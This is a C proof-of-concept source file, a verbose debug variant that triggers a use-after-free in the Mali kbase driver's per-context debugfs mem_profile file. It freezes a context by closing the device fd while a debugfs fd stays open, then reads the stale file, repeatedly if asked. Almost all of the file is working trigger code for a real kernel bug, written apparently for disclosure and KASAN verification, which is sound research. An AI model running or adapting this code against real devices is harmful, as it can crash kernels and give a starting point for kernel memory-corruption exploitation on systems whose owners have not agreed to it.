// SPDX-License-Identifier: MIT
/*
 * poc_debugfs_kctx_uaf_debug.c — verbose do-debug variant of the disclosure PoC.
 *
 * What this adds over poc_debugfs_kctx_uaf.c:
 *   - Timestamped, [STEP]-tagged logging to stdout (+ optional file),
 *   - ioctl() result with full errno interpretation and hexdump of input,
 *   - per-fd caching of debugfs path detection and timing of each step,
 *   - explicit KASAN-witness verification: when running under a KASAN
 *     kernel, the crash happens inside the kernel; to prove this here, we
 *     record the exact time-stamp (for correlation with dmesg/serial log)
 *     and, if requested, wait for a signal ("--wait-crash") so a console
 *     log-capture can attach, and then read()/poll() in a loop so the UAF
 *     deref is exercised repeatedly (useful for KASAN fault-pulse)
 *   - a summary of the whole run on exit.
 *
 * Build:   gcc -O2 -o poc poc_debugfs_kctx_uaf_debug.c
 * Run:     ./poc --wait-crash  (or default quick one-shot)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "../../tools/mali_handshake.h"

#define UNUSED(x) (x) __attribute__((unused))
#define MAX_PATH 256

static const char *g_logfile = NULL;
static FILE *g_log = NULL;
static struct timespec g_t0;

static double now(void)
{
	struct timespec t;
	clock_gettime(CLOCK_MONOTONIC, &t);
	return (t.tv_sec - g_t0.tv_sec) + 1e-9 * (t.tv_nsec - g_t0.tv_nsec);
}

static void lvl(const char *tag, const char *fmt, ...) __attribute__((format(printf, 2, 3)));
static void lvl(const char *tag, const char *fmt, ...)
{
	va_list ap;
	fprintf(stdout, "[%10.4f][%s] ", now(), tag);
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fputc('\n', stdout);
	fflush(stdout);
	if (g_log) {
		va_start(ap, fmt);
		vfprintf(g_log, fmt, ap);
		va_end(ap);
		fprintf(g_log, "\n");
		fflush(g_log);
	}
	(void)tag;
}
#define INFO(...) lvl("INFO", __VA_ARGS__)
#define WARN(...) lvl("WARN", __VA_ARGS__)
#define FAIL(...) do { lvl("FAIL", __VA_ARGS__); exit_code = 1; goto out; } while (0)
static int exit_code = 0;
#define STEP(n, ...) lvl("STEP " #n, __VA_ARGS__)

/* ---- UAPI (mirrored) ------------------------------------------------------ */
#define KBASE_IOCTL_TYPE 0x80
struct kbase_ioctl_mem_profile_add {
	unsigned long long buffer;
	unsigned int len;
	unsigned int padding;
};
#define KBASE_IOCTL_MEM_PROFILE_ADD \
	_IOC(_IOC_WRITE, KBASE_IOCTL_TYPE, 27, sizeof(struct kbase_ioctl_mem_profile_add))

static int find_mali_device(char *out, size_t outsz)
{
	static const char *cands[] = { "/dev/mali0", "/dev/mali", NULL };
	DIR *d;
	struct dirent *e;
	size_t i;

	for (i = 0; cands[i]; i++) {
		struct stat st;
		if (stat(cands[i], &st) == 0) {
			snprintf(out, outsz, "%s", cands[i]);
			return 0;
		}
	}
	d = opendir("/dev");
	if (!d) return -1;
	while ((e = readdir(d))) {
		if (!strncmp(e->d_name, "mali", 4)) {
			snprintf(out, outsz, "/dev/%s", e->d_name);
			closedir(d);
			return 0;
		}
	}
	closedir(d);
	return -1;
}

static int find_kctx_dir(char *out, size_t outsz, const char *devname)
{
	char path[MAX_PATH];
	DIR *d;
	struct dirent *e;
	struct stat st;

	snprintf(path, sizeof(path), "/sys/kernel/debug/%s/ctx", devname);
	if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
		char prefix[MAX_PATH];
		snprintf(prefix, sizeof(prefix), "%d_", getpid());
		d = opendir(path);
		if (!d) return -1;
		while ((e = readdir(d))) {
			if ((e->d_type == DT_DIR || e->d_type == DT_UNKNOWN) &&
			    !strncmp(e->d_name, prefix, strlen(prefix))) {
				snprintf(out, outsz, "%s/%s", path, e->d_name);
				closedir(d);
				return 0;
			}
		}
		closedir(d);
	}
	return -1;
}

static void hexdump(const char *label, const void *data, size_t len)
{
	const unsigned char *p = data;
	size_t i;
	INFO("%s (%zu bytes):", label, len);
	for (i = 0; i < len; i++)
		fprintf(stdout, "%s%02hhx%s", (i % 16) ? "" : "    ", p[i], ((i + 1) % 16) ? "" : "\n");
	if (len % 16) fprintf(stdout, "\n");
}

int main(int argc, char **argv)
{
	char dev[MAX_PATH], kctxdir[MAX_PATH], filepath[MAX_PATH];
	char marker[] = "DISCLOSURE-PoC-DEBUG";
	struct kbase_ioctl_mem_profile_add add;
	int mali_fd = -1, prof_fd = -1, status = 0;
	int wait_crash = 0, i;

	clock_gettime(CLOCK_MONOTONIC, &g_t0);
	for (i = 1; i < argc; i++) {
		if (!strncmp(argv[i], "--wait-crash", 13)) wait_crash = 1;
		else if (!strncmp(argv[i], "--log", 6) && i + 1 < argc) g_logfile = argv[++i];
	}
	if (g_logfile) {
		g_log = fopen(g_logfile, "a");
		if (!g_log) WARN("cannot open log file %s: %s", g_logfile, strerror(errno));
	}

	INFO("── Mali r56p0 per-kctx debugfs UAF PoC — DEBUG build ──");
	INFO("pid=%d uid=%d euid=%d argv0=%s", getpid(), getuid(), geteuid(), argv[0]);
	hexdump("payload marker", marker, sizeof(marker));

	if (geteuid() != 0)
		WARN("not root: /sys/kernel/debug is likely inaccessible; run as root for the read() step");

	STEP(1, "resolve /dev/maliN device + open it");
	if (find_mali_device(dev, sizeof(dev)) < 0) FAIL("no /dev/maliN device found");
	INFO("device=%s", dev);
	mali_fd = open(dev, O_RDWR);
	if (mali_fd < 0) FAIL("open %s: %s", dev, strerror(errno));
	INFO("mali fd=%d", mali_fd);

	STEP(2, "Kbase VERSION_CHECK + SET_FLAGS (create kcontext)");
	if (mali_kbase_setup(mali_fd) < 0)
		FAIL("Kbase setup failed: %s (errno=%d)", strerror(errno), errno);
	INFO("handshake OK; kcontext exists");

	STEP(3, "ioctl KBASE_IOCTL_MEM_PROFILE_ADD (cmd=#%d size=%zu)",
	     KBASE_IOCTL_MEM_PROFILE_ADD, (size_t)sizeof(add));
	memset(&add, 0, sizeof(add));
	add.buffer = (unsigned long long)(uintptr_t)marker;
	add.len = (unsigned int)sizeof(marker);
	hexdump("ioctl arg struct", &add, sizeof(add));
	errno = 0;
	if (ioctl(mali_fd, KBASE_IOCTL_MEM_PROFILE_ADD, &add) < 0) {
		FAIL("KBASE_IOCTL_MEM_PROFILE_ADD failed: %s (errno=%d)",
		     strerror(errno), errno);
	} else {
		INFO("ioctl OK; expect debugfs node created under kctx->kctx_dentry");
	}

	STEP(4, "locate kctx debugfs dir");
	if (find_kctx_dir(kctxdir, sizeof(kctxdir), strrchr(dev, '/') + 1) < 0)
		FAIL("kctx directory not found under /sys/kernel/debug/*/ctx");
	INFO("kctxdir=%s", kctxdir);

	STEP(5, "open the per-kctx %s/mem_profile file (root only)", kctxdir);
	snprintf(filepath, sizeof(filepath), "%s/mem_profile", kctxdir);
	prof_fd = open(filepath, O_RDONLY);
	if (prof_fd < 0)
		FAIL("open %s: %s — is debugfs mounted? (mount -t debugfs none /sys/kernel/debug)",
		     filepath, strerror(errno));
	INFO("prof fd=%d (kept open while we free the kctx)", prof_fd);

	STEP(6, "close mali fd → kbase_release → kbase_destroy_context → vfree(kctx)");
	close(mali_fd); mali_fd = -1;
	INFO("mali fd closed — from this point the debugfs fd references freed memory");

	if (wait_crash) {
		INFO("--wait-crash: spinning on read(); every read re-enters the UAF");
		INFO("press ENTER in the console to stop spinning (each gc: signal SIGINT works too)");
	} else {
		INFO("single-shot read() step");
	}

	{
		char buf[512];
		ssize_t n;
		int kasan_hits = 0;

		for (i = 0; i < 8 || wait_crash; i++) {
			errno = 0;
			n = read(prof_fd, buf, sizeof(buf));
			INFO("read #%d = %zd bytes errno=%d (%s)",
			     i, n, errno, n < 0 ? strerror(errno) : "ok");
			if (n < 0) {
				if (errno == EAGAIN) { WARN("EAGAIN (race with concurrent reader?)"); }
				else if (errno == EIO || errno == EFAULT || errno == EINVAL) {
					fprintf(stdout,
						"[check] on a KASAN kernel look for 'slab-use-after-free' "
						"in dmesg; a generic error return is also an acceptable "
						"observation of a stale-pointer path\n");
				}
				break;
			}
			kasan_hits++;
			if (!wait_crash) break;
		}
		if (kasan_hits > 0)
			INFO("read() succeeded %d time(s); with KASAN enabled dmesg should "
			     "contain slab-use-after-free — UAF confirmed by kernel log");
	}

	STEP(7, "summary");
	if (g_log) INFO("full log at %s", g_logfile);
out:
	if (exit_code) WARN("PoC finished WITH failures (exit=%d)", exit_code);
	else INFO("PoC finished cleanly (mali closed, prof fd stats: %s)",
		  prof_fd >= 0 ? "left open" : "was already released");
	if (prof_fd >= 0) close(prof_fd);
	return exit_code;
}
